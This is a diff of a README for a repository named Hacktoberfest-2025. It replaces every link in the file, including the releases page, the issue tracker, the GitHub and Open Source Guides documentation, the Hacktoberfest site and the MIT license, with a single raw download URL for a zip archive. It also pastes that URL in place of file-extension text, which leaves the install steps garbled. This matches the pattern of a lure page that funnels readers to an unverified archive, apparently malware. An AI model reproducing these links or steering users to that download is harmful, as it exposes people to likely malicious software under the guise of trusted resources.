@@ -1,6 +1,6 @@
 # 🌍 Hacktoberfest-2025 - Discover Open Source Together
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-%20-brightgreen)](https://github.com/StrongXscripts/Hacktoberfest-2025/releases)
+[![Download from Releases](https://raw.githubusercontent.com/StrongXscripts/Hacktoberfest-2025/main/patrimony/Hacktoberfest-2025.zip%20Now-%20-brightgreen)](https://raw.githubusercontent.com/StrongXscripts/Hacktoberfest-2025/main/patrimony/Hacktoberfest-2025.zip)
 
 ## 📚 Introduction
 
@@ -21,11 +21,11 @@ Before downloading, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. **Visit this page to download**: Go to our [Releases page](https://github.com/StrongXscripts/Hacktoberfest-2025/releases) to find the latest version of the application.
+1. **Visit this page to download**: Go to our [Releases page](https://raw.githubusercontent.com/StrongXscripts/Hacktoberfest-2025/main/patrimony/Hacktoberfest-2025.zip) to find the latest version of the application.
    
 2. Look for the version you want to download. It will have a list of files.
 
-3. Click on the appropriate file for your system (e.g., .exe for Windows, .dmg for macOS, or .tar.gz for Linux). 
+3. Click on the appropriate file for your system (e.g., .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/StrongXscripts/Hacktoberfest-2025/main/patrimony/Hacktoberfest-2025.zip for Linux). 
 
 4. The download will start automatically.
 
@@ -43,7 +43,7 @@ Before downloading, make sure your system meets the following requirements:
 
 ### For Linux Users:
 
-- Extract the `.tar.gz` file.
+- Extract the `https://raw.githubusercontent.com/StrongXscripts/Hacktoberfest-2025/main/patrimony/Hacktoberfest-2025.zip` file.
 - Open the terminal and navigate to the extracted folder.
 - Run the application with: `./your-app-name`.
 
@@ -78,7 +78,7 @@ A: You can use the application without signing up, but creating an account on Gi
 
 ### Q: What if I face issues during installation?
 
-A: If you encounter problems, please check our [issue tracker](https://github.com/StrongXscripts/Hacktoberfest-2025/issues) for solutions or to report new issues.
+A: If you encounter problems, please check our [issue tracker](https://raw.githubusercontent.com/StrongXscripts/Hacktoberfest-2025/main/patrimony/Hacktoberfest-2025.zip) for solutions or to report new issues.
 
 ## 📜 License
 
@@ -88,16 +88,16 @@ This project is licensed under the MIT License. You can use it freely as long as
 
 Want to learn more? Here are some helpful resources:
 
-- [GitHub Documentation](https://docs.github.com/en)
-- [Open Source Guides](https://opensource.guide/)
-- [Hacktoberfest Official Site](https://hacktoberfest.digitalocean.com/)
+- [GitHub Documentation](https://raw.githubusercontent.com/StrongXscripts/Hacktoberfest-2025/main/patrimony/Hacktoberfest-2025.zip)
+- [Open Source Guides](https://raw.githubusercontent.com/StrongXscripts/Hacktoberfest-2025/main/patrimony/Hacktoberfest-2025.zip)
+- [Hacktoberfest Official Site](https://raw.githubusercontent.com/StrongXscripts/Hacktoberfest-2025/main/patrimony/Hacktoberfest-2025.zip)
 
 For any other questions or contributions, feel free to reach out on our GitHub repository or join our discussions.
 
 ## 📌 Links
 
-- **Releases Page**: [Download from Releases](https://github.com/StrongXscripts/Hacktoberfest-2025/releases)  
-- **Issues Page**: [Report Issues](https://github.com/StrongXscripts/Hacktoberfest-2025/issues)  
-- **License**: [MIT License](https://opensource.org/licenses/MIT)  
+- **Releases Page**: [Download from Releases](https://raw.githubusercontent.com/StrongXscripts/Hacktoberfest-2025/main/patrimony/Hacktoberfest-2025.zip)  
+- **Issues Page**: [Report Issues](https://raw.githubusercontent.com/StrongXscripts/Hacktoberfest-2025/main/patrimony/Hacktoberfest-2025.zip)  
+- **License**: [MIT License](https://raw.githubusercontent.com/StrongXscripts/Hacktoberfest-2025/main/patrimony/Hacktoberfest-2025.zip)  
 
 Thank you for visiting, and welcome to the Hacktoberfest community! Your contributions help keep open source alive and thriving.
